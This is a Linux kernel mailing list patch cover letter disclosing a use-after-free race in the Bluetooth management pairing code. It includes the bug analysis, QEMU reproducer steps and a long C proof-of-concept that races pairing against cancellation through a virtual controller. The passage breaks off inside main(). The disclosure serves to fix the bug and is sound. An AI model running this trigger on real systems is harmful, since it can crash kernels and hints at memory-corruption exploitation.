Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 77A573F823D
	for <linux-bluetooth@vger.kernel.org>; Tue, 21 Jul 2026 14:36:16 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784644583; cv=none; b=BVrHkhDFFZEwKvdxshv9pPcEd2eBZzdWuQnEkRkBasWD4Cj3zWAgtksWS2dAVsNaXK2ht1+Imfu2asFN0aZ06KyGtscL91HuksnJXTv+D4RFavWRObZ3Dz2umyH6ICksqEiRcRwWHRVng0Nw8ZxLQY0J29FvHEAYPCr7wBZjueM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784644583; c=relaxed/simple;
	bh=edd37PnMZtp9sCywaTIhcoDGwE8J0/ZvU1YdENatDoU=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=pVulOSA9zZbycz3cYDR015XAdQU4l3LgRqV6eE+3O/lCNWGsvr7IXB0/PITywJQ3ZE5wuoXKLi2zIAZsH7nME7YTCzYo3Vdwcx11huzpfO1OI4zBdoblzOKFkmj+EGsu6JqlVgld00P9R4mwa7MuAxPRZMEeoVxLIGBEGh64Jdg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=qhXAZ1hw; arc=none smtp.client-ip=209.85.210.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="qhXAZ1hw"
Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-84a2dcede83so10852809b3a.3
        for <linux-bluetooth@vger.kernel.org>; Tue, 21 Jul 2026 07:36:16 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784644575; x=1785249375; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=BAGlr+5guI1JRO7nWyTxYBbqMHMt+tclK1j4dnB2IA4=;
        b=qhXAZ1hwjYLTDklQDrenc7sT0CnVrguuGYTWaX9lJ7qCd4VzAwWj86ofXEmIDiwf+O
         sXZwMpl6T72+iRfYgltIKGtfThVemyA9TbBQ44zfi0tYF9YfX9UWXyCW4kFO0TkZ0JF4
         2c/2DwmYtEJiChDYUHIrpprnn7mppZeL9wYI+oCJ+XUDHtRCwF6reW3kAgeJTZbv0sci
         PfM8L96UHPRcS9NccVmV1Vht+HYm/5zOCfpLK7j2JZvm//e5In4YSBs5ddrufQ4L/O5u
         q1xOMg7+TiuLWi0Gm19P/tfsh2d6NgIfH6PhNd3nwTc3Wteqd+AerFWk60zICSqlB0YO
         NI3Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784644575; x=1785249375;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=BAGlr+5guI1JRO7nWyTxYBbqMHMt+tclK1j4dnB2IA4=;
        b=W9fwJLK6UPn2ZNw5ltMnMzyVZbodtyoRtJKkLSYnfddRMlwTU+fY15LRQNGPdBkXSi
         ZVOtFCst5nGReRlYbkNPgjqNBXco60Ymun/7PxBG14CP4rgJq7IhduEDWd3A5UNWawdb
         gT2Yd4Cxi+WG4owODwhQ+PK0rHY07Exv93BA9szq/HZf9K4wlA8ueqjqCIOIVspL5qf2
         XbfgWnyj/Sdve8PypPEiZGj7dFA908kinlGt7rDyiCqEXkBV06SXiO8OJWhk2WfpiRcW
         4zfmNpIh21psO9gZYvWOVYKK1w/b/BVcpbjcPIK6CLAJzZje9PkwfP+sf6wXpND/3+GU
         a0hw==
X-Gm-Message-State: AOJu0Yzf3cdYYeMbQoPmpwn7slRdVtdgU7ZzCgwezlicL8e3ucxCQCeL
	VDYJCMMNNrBs76F9Cz4STaLKI6miN6T2kVduKgFP9q7/pwcEQKKtagE6mScVvTOv
X-Gm-Gg: AR+sD13mTjyJbgsTNPJE9C+DCPXRZS/tNYk1QS6PRbv8l1LBBGUlVg7eB3aieGnhay2
	AiOsGGjSfqsFTLM+OgQ0h2wGdfAAd5T6xu7Ak/mYqkrbU7WvBXOD1acORBikSiW6j02jsD9k3NK
	Vxc1B6G1pTcyAzA2ydQL0cXA5Jf1iYwL2sOSCK9fBaad0W70EqwRMvevhsqOVBKoUXhnbVR428M
	+bfOyMpbbGdi+r/V9ccaxuqiQxrEeH9k/dqEozsFGuA8bRSghNJsP1q3Aj/9OHi7cnNBQ4VB0M8
	NKNK3/2h7lt9i+u8mgEJakMeVpGLJOzQ7m0P4TYPxXZlHy5cQsirqL9m8BgOrpyq3dUukJfJ41B
	I5QLS0960N4hA7UeWKike6EdGRSmD5CeAbAIhvh9rx/vJzpTU+19hGj9QSeed7iW4kvvTuv9pTV
	Oobel+lceCZK1DaGwi+Q==
X-Received: by 2002:a05:6a00:9aa:b0:848:2f77:e2db with SMTP id d2e1a72fcca58-84c2952c402mr17712979b3a.68.1784644574345;
        Tue, 21 Jul 2026 07:36:14 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84c2e388aa7sm7420058b3a.5.2026.07.21.07.36.09
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 21 Jul 2026 07:36:13 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-bluetooth@vger.kernel.org
Cc: marcel@holtmann.org,
	luiz.dentz@gmail.com,
	padovan@profusion.mobi,
	johan.hedberg@nokia.com,
	vega@nebusec.ai,
	xizh2024@lzu.edu.cn,
	enjou1224z@gmail.com
Subject: [PATCH 0/1] Bluetooth: mgmt: fix pairing command UAF
Date: Tue, 21 Jul 2026 22:36:06 +0800
Message-ID: <cover.1784492458.git.xizh2024@lzu.edu.cn>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zihan Xi <xizh2024@lzu.edu.cn>


Hi Linux kernel maintainers,

We found and validated a bug in net/bluetooth/mgmt.c. The bug is
reachable by a privileged local user through the Bluetooth management
interface when a Pair Device command races with pairing failure and
cancellation paths. The fixed kernel was run with the reproducer for
420 seconds and then for 1200 seconds without the original KASAN
use-after-free, list_debug BUG, or panic. The reproducer did not
naturally finish before the timeout in those fixed-kernel runs.

This series contains one patch:
  1/1 Bluetooth: mgmt: fix UAF in pair command cancellation

We provide bug details, reproducer steps, and a crash log below.

---- details below ----

Bug details:

find_pairing() walked hdev->mgmt_pending without holding
mgmt_pending_lock and returned a still-listed mgmt_pending_cmd pointer
to pairing completion and authentication failure callbacks.

pair_device() stores the live hci_conn pointer in cmd->user_data. A
concurrent MGMT_OP_CANCEL_PAIR_DEVICE request can remove and free the
same pending command while a pairing callback still holds the pointer
returned by find_pairing(). The reverse race is also possible because
cancel_pair_device() used pending_find(), which also returns a bare
pending command after dropping mgmt_pending_lock. Either side can then
dereference freed memory or call mgmt_pending_remove() on an object
that has already been removed from the list.

This patch makes the pairing lookup helpers transfer ownership by
removing the command from hdev->mgmt_pending while holding
mgmt_pending_lock. The callbacks and cancel path then complete the
command and free it directly, so racing paths cannot find or free the
same command again. The cancel path takes a temporary hci_conn
reference because the command completion drops the reference stored in
the pending command.

The unsafe pending-command lifetime originated when mgmt_pair_device
introduced the dedicated pairing pending command and connection
callbacks. The current reproducer uses the later LE SMP failure and
management cancel path to expose the race, but the broken ownership
model is anchored at the original mgmt_pair_device change. Therefore
the patch uses that commit in the Fixes tag.

Reproducer:

    # Host: boot the fixed or unfixed kernel in a 2 vCPU, 2 GB RAM QEMU.
    scp -i <key> -P <port> poc.c Makefile root@localhost:/root/

    # Guest:
    cd /root
    cc -O2 -pthread -o /root/poc /root/poc.c
    /root/poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef AF_BLUETOOTH
#define AF_BLUETOOTH 31
#endif

#ifndef BTPROTO_HCI
#define BTPROTO_HCI 1
#endif

#define HCI_DEV_NONE 0xffff
#define HCI_CHANNEL_CONTROL 3

#define HCI_COMMAND_PKT 0x01
#define HCI_ACLDATA_PKT 0x02
#define HCI_EVENT_PKT 0x04
#define HCI_VENDOR_PKT 0xff

#define EVT_DISCONN_COMPLETE 0x05
#define EVT_CMD_COMPLETE 0x0e
#define EVT_CMD_STATUS 0x0f
#define EVT_LE_META 0x3e

#define LE_META_CONN_COMPLETE 0x01

#define MGMT_INDEX_NONE 0xffff

#define MGMT_OP_READ_INDEX_LIST 0x0003
#define MGMT_OP_SET_BONDABLE 0x0009
#define MGMT_OP_PAIR_DEVICE 0x0019
#define MGMT_OP_CANCEL_PAIR_DEVICE 0x001a

#define MGMT_EV_CMD_COMPLETE 0x0001
#define MGMT_EV_CMD_STATUS 0x0002

#define BDADDR_BREDR 0x00
#define BDADDR_LE_PUBLIC 0x01
#define BDADDR_LE_RANDOM 0x02

#define IO_CAP_NO_INPUT_NO_OUTPUT 0x03

#define CONN_HANDLE 0x0040

#define SMP_CMD_PAIRING_REQ 0x01
#define SMP_CMD_PAIRING_FAIL 0x05
#define SMP_REASON_CONFIRM_FAILED 0x04

#define ITERATIONS 20000
#define MGMT_READ_TIMEOUT_MS 2000

struct sockaddr_hci {
	sa_family_t hci_family;
	unsigned short hci_dev;
	unsigned short hci_channel;
};

struct mgmt_hdr {
	uint16_t opcode;
	uint16_t index;
	uint16_t len;
} __attribute__((packed));

struct mgmt_addr_info {
	uint8_t bdaddr[6];
	uint8_t type;
} __attribute__((packed));

struct mgmt_cp_pair_device {
	struct mgmt_addr_info addr;
	uint8_t io_cap;
} __attribute__((packed));

struct mgmt_ev_cmd_complete {
	uint16_t opcode;
	uint8_t status;
	uint8_t data[];
} __attribute__((packed));

struct mgmt_ev_cmd_status {
	uint16_t opcode;
	uint8_t status;
} __attribute__((packed));

static const uint8_t peer_addr[6] = { 0xa6, 0xa5, 0xa4, 0xa3, 0xa2, 0xa1 };

static pthread_mutex_t state_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t state_cv = PTHREAD_COND_INITIALIZER;
static pthread_mutex_t mgmt_lock = PTHREAD_MUTEX_INITIALIZER;

static int vhci_fd = -1;
static int mgmt_ctl_fd = -1;
static int mgmt_pair_fd = -1;
static volatile int keep_running = 1;
static int controller_index = -1;

static unsigned long current_generation;
static unsigned long smp_generation;
static bool injection_scheduled;

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(1);
}

static void info(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
}

static int write_all(int fd, const void *buf, size_t len)
{
	const uint8_t *p = buf;
	size_t off = 0;

	while (off < len) {
		ssize_t ret = write(fd, p + off, len - off);

		if (ret < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}

		off += (size_t)ret;
	}

	return 0;
}

static void send_event(uint8_t evt, const void *payload, size_t len)
{
	uint8_t buf[512];

	if (len + 3 > sizeof(buf))
		die("event too large");

	buf[0] = HCI_EVENT_PKT;
	buf[1] = evt;
	buf[2] = (uint8_t)len;
	memcpy(buf + 3, payload, len);

	if (write_all(vhci_fd, buf, len + 3) < 0)
		die("write event failed: %s", strerror(errno));
}

static void send_cmd_complete(uint16_t opcode, const void *params, size_t len)
{
	uint8_t payload[512];

	if (len + 3 > sizeof(payload))
		die("cmd complete too large");

	payload[0] = 1;
	memcpy(payload + 1, &opcode, sizeof(opcode));
	memcpy(payload + 3, params, len);
	send_event(EVT_CMD_COMPLETE, payload, len + 3);
}

static void send_cmd_status(uint8_t status, uint16_t opcode)
{
	uint8_t payload[4];

	payload[0] = status;
	payload[1] = 1;
	memcpy(payload + 2, &opcode, sizeof(opcode));
	send_event(EVT_CMD_STATUS, payload, sizeof(payload));
}

static void send_le_conn_complete(void)
{
	struct {
		uint8_t subevent;
		uint8_t status;
		uint16_t handle;
		uint8_t role;
		uint8_t peer_type;
		uint8_t peer_addr[6];
		uint16_t interval;
		uint16_t latency;
		uint16_t timeout;
		uint8_t clock_accuracy;
	} __attribute__((packed)) ev = {
		.subevent = LE_META_CONN_COMPLETE,
		.status = 0,
		.handle = CONN_HANDLE,
		.role = 0,
		.peer_type = 1,
		.interval = 24,
		.latency = 0,
		.timeout = 200,
		.clock_accuracy = 0,
	};

	memcpy(ev.peer_addr, peer_addr, sizeof(ev.peer_addr));
	send_event(EVT_LE_META, &ev, sizeof(ev));
}

static void send_le_adv_report(void)
{
	struct {
		uint8_t subevent;
		uint8_t num;
		uint8_t evt_type;
		uint8_t addr_type;
		uint8_t addr[6];
		uint8_t data_len;
		int8_t rssi;
	} __attribute__((packed)) ev = {
		.subevent = 0x02,
		.num = 1,
		.evt_type = 0x00,
		.addr_type = 1,
		.data_len = 0,
		.rssi = -30,
	};

	memcpy(ev.addr, peer_addr, sizeof(ev.addr));
	send_event(EVT_LE_META, &ev, sizeof(ev));
}

static void send_disconn_complete(void)
{
	struct {
		uint8_t status;
		uint16_t handle;
		uint8_t reason;
	} __attribute__((packed)) ev = {
		.status = 0,
		.handle = CONN_HANDLE,
		.reason = 0x13,
	};

	send_event(EVT_DISCONN_COMPLETE, &ev, sizeof(ev));
}

static void send_acl_smp_pairing_failed(void)
{
	struct {
		uint8_t pkt_type;
		uint16_t handle;
		uint16_t dlen;
		uint16_t l2cap_len;
		uint16_t cid;
		uint8_t smp_cmd;
		uint8_t reason;
	} __attribute__((packed)) pkt = {
		.pkt_type = HCI_ACLDATA_PKT,
		.handle = (uint16_t)(CONN_HANDLE | (2u << 12)),
		.dlen = 6,
		.l2cap_len = 2,
		.cid = 0x0006,
		.smp_cmd = SMP_CMD_PAIRING_FAIL,
		.reason = SMP_REASON_CONFIRM_FAILED,
	};

	if (write_all(vhci_fd, &pkt, sizeof(pkt)) < 0)
		die("write ACL failed: %s", strerror(errno));
}

static void send_le_remote_features_complete(void)
{
	struct {
		uint8_t subevent;
		uint8_t status;
		uint16_t handle;
		uint8_t features[8];
	} __attribute__((packed)) ev = {
		.subevent = 0x04,
		.status = 0,
		.handle = CONN_HANDLE,
		.features = { 0 },
	};

	send_event(EVT_LE_META, &ev, sizeof(ev));
}

static void *inject_failure_thread(void *arg)
{
	unsigned long gen = (unsigned long)(uintptr_t)arg;
	struct timespec ts = {
		.tv_sec = 0,
		.tv_nsec = 300000,
	};

	nanosleep(&ts, NULL);

	pthread_mutex_lock(&state_lock);
	if (keep_running && gen == current_generation) {
		send_acl_smp_pairing_failed();
		injection_scheduled = false;
	} else {
		injection_scheduled = false;
	}
	pthread_mutex_unlock(&state_lock);

	return NULL;
}

static void schedule_pairing_failed(void)
{
	pthread_t tid;

	if (injection_scheduled)
		return;

	injection_scheduled = true;
	if (pthread_create(&tid, NULL, inject_failure_thread,
			   (void *)(uintptr_t)current_generation) != 0)
		die("pthread_create failed");
	pthread_detach(tid);
}

static void handle_hci_command(uint16_t opcode, const uint8_t *params, size_t plen)
{
	static const uint8_t status_ok = 0;
	static const uint8_t local_features[9] = {
		0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00
	};
	static const uint8_t le_features[9] = {
		0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
	};
	static const uint8_t le_states[9] = {
		0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};
	static const uint8_t local_cmds[65] = { 0 };

	info("HCI cmd 0x%04x len=%zu", opcode, plen);

	switch (opcode) {
	case 0x0c03: /* Reset */
		send_cmd_complete(opcode, &status_ok, 1);
		return;
	case 0x1001: { /* Read Local Version */
		struct {
			uint8_t status;
			uint8_t hci_ver;
			uint16_t hci_rev;
			uint8_t lmp_ver;
			uint16_t manufacturer;
			uint16_t subver;
		} __attribute__((packed)) rp = {
			.status = 0,
			.hci_ver = 0x09,
			.hci_rev = 0,
			.lmp_ver = 0x09,
			.manufacturer = 1,
			.subver = 0x1234,
		};
		send_cmd_complete(opcode, &rp, sizeof(rp));
		return;
	}
	case 0x1002: /* Read Local Supported Commands */
		send_cmd_complete(opcode, local_cmds, sizeof(local_cmds));
		return;
	case 0x1003: /* Read Local Supported Features */
		send_cmd_complete(opcode, local_features, sizeof(local_features));
		return;
	case 0x1005: { /* Read Buffer Size */
		struct {
			uint8_t status;
			uint16_t acl_mtu;
			uint8_t sco_mtu;
			uint16_t acl_pkts;
			uint16_t sco_pkts;
		} __attribute__((packed)) rp = {
			.status = 0,
			.acl_mtu = 0x00fb,
			.sco_mtu = 0,
			.acl_pkts = 0x0010,
			.sco_pkts = 0,
		};
		send_cmd_complete(opcode, &rp, sizeof(rp));
		return;
	}
	case 0x1009: { /* Read BD_ADDR */
		struct {
			uint8_t status;
			uint8_t addr[6];
		} __attribute__((packed)) rp = {
			.status = 0,
			.addr = { 0x66, 0x55, 0x44, 0x33, 0x22, 0x11 },
		};
		send_cmd_complete(opcode, &rp, sizeof(rp));
		return;
	}
	case 0x0c01: /* Set Event Mask */
	case 0x2001: /* LE Set Event Mask */
	case 0x0c13: /* Write Local Name */
	case 0x0c52: /* Write EIR */
	case 0x2005: /* LE Set Random Address */
	case 0x200b: /* LE Set Scan Parameters */
	case 0x202d: /* LE Set Address Resolution Enable */
	case 0x202e: /* LE Set RPA Timeout */
	case 0x2031: /* LE Set Default PHY */
	case 0x2060: /* LE Read Buffer Size v2 - not used, but harmless */
	case 0x2074: /* LE Set Host Feature */
		send_cmd_complete(opcode, &status_ok, 1);
		return;
	case 0x200c: /* LE Set Scan Enable */
		send_cmd_complete(opcode, &status_ok, 1);
		if (plen >= 1 && params[0]) {
			usleep(1000);
			send_le_adv_report();
		}
		return;
	case 0x2002: { /* LE Read Buffer Size */
		struct {
			uint8_t status;
			uint16_t le_mtu;
			uint8_t le_pkts;
		} __attribute__((packed)) rp = {
			.status = 0,
			.le_mtu = 0x00fb,
			.le_pkts = 0x10,
		};
		send_cmd_complete(opcode, &rp, sizeof(rp));
		return;
	}
	case 0x2003: /* LE Read Local Supported Features */
		send_cmd_complete(opcode, le_features, sizeof(le_features));
		return;
	case 0x201c: /* LE Read Supported States */
		send_cmd_complete(opcode, le_states, sizeof(le_states));
		return;
	case 0x200d: /* LE Create Connection */
		send_cmd_status(0, opcode);
		usleep(1000);
		send_le_conn_complete();
		return;
	case 0x2016: /* LE Read Remote Features */
		send_cmd_status(0, opcode);
		usleep(1000);
		send_le_remote_features_complete();
		return;
	case 0x200e: /* LE Create Connection Cancel */
		send_cmd_complete(opcode, &status_ok, 1);
		return;
	case 0x0406: /* Disconnect */
		send_cmd_status(0, opcode);
		usleep(1000);
		send_disconn_complete();
		return;
	default:
		/* Keep probing tolerant. Returning success is enough for the
		 * controller-init and pair/cancel race path exercised here.
		 */
		(void)params;
		(void)plen;
		send_cmd_complete(opcode, &status_ok, 1);
		return;
	}
}

static void process_acl_from_host(const uint8_t *buf, size_t len)
{
	uint16_t handle_flags, dlen, l2len, cid;
	uint16_t handle;
	uint8_t smp_cmd;

	if (len < 9)
		return;

	memcpy(&handle_flags, buf + 1, sizeof(handle_flags));
	memcpy(&dlen, buf + 3, sizeof(dlen));
	memcpy(&l2len, buf + 5, sizeof(l2len));
	memcpy(&cid, buf + 7, sizeof(cid));
	handle = handle_flags & 0x0fff;

	if (handle != CONN_HANDLE || (size_t)dlen + 5 > len)
		return;

	if (cid != 0x0006 || l2len < 1)
		return;

	smp_cmd = buf[9];
	if (smp_cmd != SMP_CMD_PAIRING_REQ)
		return;

	pthread_mutex_lock(&state_lock);
	if (smp_generation != current_generation) {
		smp_generation = current_generation;
		schedule_pairing_failed();
		pthread_cond_broadcast(&state_cv);
	}
	pthread_mutex_unlock(&state_lock);
}

static void *vhci_thread(void *arg)
{
	uint8_t buf[4096];

	(void)arg;

	for (;;) {
		ssize_t ret = read(vhci_fd, buf, sizeof(buf));

		if (ret < 0) {
			if (errno == EINTR)
				continue;
			die("read vhci failed: %s", strerror(errno));
		}

		if (ret == 0)
			return NULL;

		switch (buf[0]) {
		case HCI_COMMAND_PKT: {
			uint16_t opcode;
			uint8_t plen;

			if (ret < 4)
				continue;

			memcpy(&opcode, buf + 1, sizeof(opcode));
			plen = buf[3];
			if ((size_t)ret < (size_t)plen + 4)
				continue;
			handle_hci_command(opcode, buf + 4, plen);
			break;
		}
		case HCI_ACLDATA_PKT:
			process_acl_from_host(buf, (size_t)ret);
			break;
		default:
			break;
		}
	}
}

static int open_mgmt_socket(void)
{
	struct sockaddr_hci addr = {
		.hci_family = AF_BLUETOOTH,
		.hci_dev = HCI_DEV_NONE,
		.hci_channel = HCI_CHANNEL_CONTROL,
	};
	int fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);

	if (fd < 0)
		die("socket(AF_BLUETOOTH) failed: %s", strerror(errno));

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind control socket failed: %s", strerror(errno));

	return fd;
}

static int mgmt_write_cmd(uint16_t opcode, uint16_t index,
			  const void *payload, uint16_t len, int fd)
{
	uint8_t buf[512];
	struct mgmt_hdr hdr = {
		.opcode = opcode,
		.index = index,
		.len = len,
	};

	if (sizeof(hdr) + len > sizeof(buf))
		return -1;

	memcpy(buf, &hdr, sizeof(hdr));
	if (len)
		memcpy(buf + sizeof(hdr), payload, len);

	return write_all(fd, buf, sizeof(hdr) + len);
}

static int mgmt_recv_one(int fd, uint8_t *buf, size_t size, int timeout_ms)
{
	struct timeval tv;
	fd_set rfds;

	FD_ZERO(&rfds);
	FD_SET(fd, &rfds);

	tv.tv_sec = timeout_ms / 1000;
	tv.tv_usec = (timeout_ms % 1000) * 1000;

	if (select(fd + 1, &rfds, NULL, NULL, &tv) <= 0)
		return -1;

	return (int)read(fd, buf, size);
}

static int mgmt_wait_for_reply(uint16_t want_opcode, uint16_t want_index,
			       uint8_t *status_out, uint8_t *payload,
			       size_t *payload_len)
{
	uint8_t buf[1024];

	for (;;) {
		int ret = mgmt_recv_one(mgmt_ctl_fd, buf, sizeof(buf),
					MGMT_READ_TIMEOUT_MS);
		struct mgmt_hdr *hdr;

		if (ret < 0)
			return -1;
		if ((size_t)ret < sizeof(*hdr))
			continue;

		hdr = (struct mgmt_hdr *)buf;
		info("mgmt event opcode=0x%04x index=%u len=%u",
		     hdr->opcode, hdr->index, hdr->len);
		if (hdr->opcode == MGMT_EV_CMD_COMPLETE) {
			struct mgmt_ev_cmd_complete *cc;
			size_t cc_len;

			if ((size_t)ret < sizeof(*hdr) + sizeof(*cc))
				continue;

			cc = (struct mgmt_ev_cmd_complete *)(buf + sizeof(*hdr));
			cc_len = hdr->len - sizeof(*cc);
			info("  cmd_complete inner=0x%04x status=0x%02x payload=%zu",
			     cc->opcode, cc->status, cc_len);
			if (cc->opcode != want_opcode || hdr->index != want_index)
				continue;

			*status_out = cc->status;
			if (payload && payload_len && cc_len <= *payload_len) {
				memcpy(payload, cc->data, cc_len);
				*payload_len = cc_len;
			} else if (payload_len) {
				*payload_len = 0;
			}
			return 0;
		}

		if (hdr->opcode == MGMT_EV_CMD_STATUS) {
			struct mgmt_ev_cmd_status *cs;

			if ((size_t)ret < sizeof(*hdr) + sizeof(*cs))
				continue;

			cs = (struct mgmt_ev_cmd_status *)(buf + sizeof(*hdr));
			info("  cmd_status inner=0x%04x status=0x%02x",
			     cs->opcode, cs->status);
			if (cs->opcode != want_opcode || hdr->index != want_index)
				continue;

			*status_out = cs->status;
			if (payload_len)
				*payload_len = 0;
			return 0;
		}
	}
}

static int mgmt_send_sync(uint16_t opcode, uint16_t index,
			  const void *payload, uint16_t len, uint8_t *status)
{
	size_t dummy_len = 0;

	pthread_mutex_lock(&mgmt_lock);
	if (mgmt_write_cmd(opcode, index, payload, len, mgmt_ctl_fd) < 0) {
		pthread_mutex_unlock(&mgmt_lock);
		return -1;
	}

	if (mgmt_wait_for_reply(opcode, index, status, NULL, &dummy_len) < 0) {
		pthread_mutex_unlock(&mgmt_lock);
		return -1;
	}
	pthread_mutex_unlock(&mgmt_lock);

	return 0;
}

static int wait_for_index_list(void)
{
	uint8_t status;
	uint8_t buf[256];
	size_t len = sizeof(buf);
	int attempt;

	for (attempt = 0; attempt < 50; attempt++) {
		pthread_mutex_lock(&mgmt_lock);
		if (mgmt_write_cmd(MGMT_OP_READ_INDEX_LIST, MGMT_INDEX_NONE,
				   NULL, 0, mgmt_ctl_fd) < 0) {
			pthread_mutex_unlock(&mgmt_lock);
			return -1;
		}

		len = sizeof(buf);
		if (mgmt_wait_for_reply(MGMT_OP_READ_INDEX_LIST, MGMT_INDEX_NONE,
					&status, buf, &len) == 0 && !status &&
		    len >= 2) {
			uint16_t count;

			memcpy(&count, buf, sizeof(count));
			info("read index list attempt %d count=%u", attempt + 1, count);
			if (count > 0) {
				pthread_mutex_unlock(&mgmt_lock);
				return 0;
			}
		}
		pthread_mutex_unlock(&mgmt_lock);

		usleep(100000);
	}

	return -1;
}

static void *mgmt_drain_thread(void *arg)
{
	uint8_t buf[1024];

	(void)arg;

	for (;;) {
		ssize_t ret = read(mgmt_pair_fd, buf, sizeof(buf));

		if (ret < 0) {
			if (errno == EINTR)
				continue;
			return NULL;
		}

		if (ret < (ssize_t)sizeof(struct mgmt_hdr))
			continue;
	}
}

static void send_cancel_pair(void)
{
	struct mgmt_addr_info addr;
	uint8_t status = 0xff;

	memset(&addr, 0, sizeof(addr));
	memcpy(addr.bdaddr, peer_addr, sizeof(addr.bdaddr));
	addr.type = BDADDR_LE_RANDOM;

	if (mgmt_send_sync(MGMT_OP_CANCEL_PAIR_DEVICE, controller_index,
			   &addr, sizeof(addr), &status) < 0)
		info("cancelpair send failed: %s", strerror(errno));
}

static int start_pairing(void)
{
	struct mgmt_cp_pair_device cp;

	memset(&cp, 0, sizeof(cp));
	memcpy(cp.addr.bdaddr, peer_addr, sizeof(cp.addr.bdaddr));
	cp.addr.type = BDADDR_LE_RANDOM;
	cp.io_cap = IO_CAP_NO_INPUT_NO_OUTPUT;

	if (mgmt_write_cmd(MGMT_OP_PAIR_DEVICE, controller_index,
			   &cp, sizeof(cp), mgmt_pair_fd) < 0)
		return -1;

	return 0;
}

static bool wait_for_smp_request(unsigned long gen)
{
	struct timespec ts;
	int ret = 0;

	clock_gettime(CLOCK_REALTIME, &ts);
	ts.tv_nsec += 500000000;
	if (ts.tv_nsec >= 1000000000) {
		ts.tv_sec++;
		ts.tv_nsec -= 1000000000;
	}

	pthread_mutex_lock(&state_lock);
	while (keep_running && smp_generation < gen && ret == 0)
		ret = pthread_cond_timedwait(&state_cv, &state_lock, &ts);
	pthread_mutex_unlock(&state_lock);

	return smp_generation >= gen;
}

static void set_affinity(void)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(0, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

int main(void)
{
	pthread_t vhci_tid;
	pthread_t pair_drain_tid;
	int i;
	uint8_t status = 0xff;
	uint8_t bondable = 0x01;

	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
	set_affinity();

	system("echo 0 > /proc/sys/kernel/panic_on_warn");

	vhci_fd = open("/dev/vhci", O_RDWR);
	if (vhci_fd < 0)
		die("open /dev/vhci failed: %s", strerror(errno));

	{
		uint8_t create[2] = { HCI_VENDOR_PKT, 0x00 };
		uint8_t resp[4];

		if (write_all(vhci_fd, create, sizeof(create)) < 0)
			die("create vhci failed: %s", strerror(errno));

		if (read(vhci_fd, resp, sizeof(resp)) != (ssize_t)sizeof(resp))
			die("read create response failed");
		controller_index = resp[2] | (resp[3] << 8);
		info("controller index=%d", controller_index);
	}

	if (pthread_create(&vhci_tid, NULL, vhci_thread, NULL) != 0)
		die("pthread_create(vhci) failed");

	mgmt_ctl_fd = open_mgmt_socket();
	mgmt_pair_fd = open_mgmt_socket();

	if (pthread_create(&pair_drain_tid, NULL, mgmt_drain_thread, NULL) != 0)
		die("pthread_create(pair_drain) failed");

	info("waiting for mgmt index");
	if (wait_for_index_list() < 0)
		die("controller did not appear in mgmt index list");
	info("mgmt index ready");

	info("setting bondable");
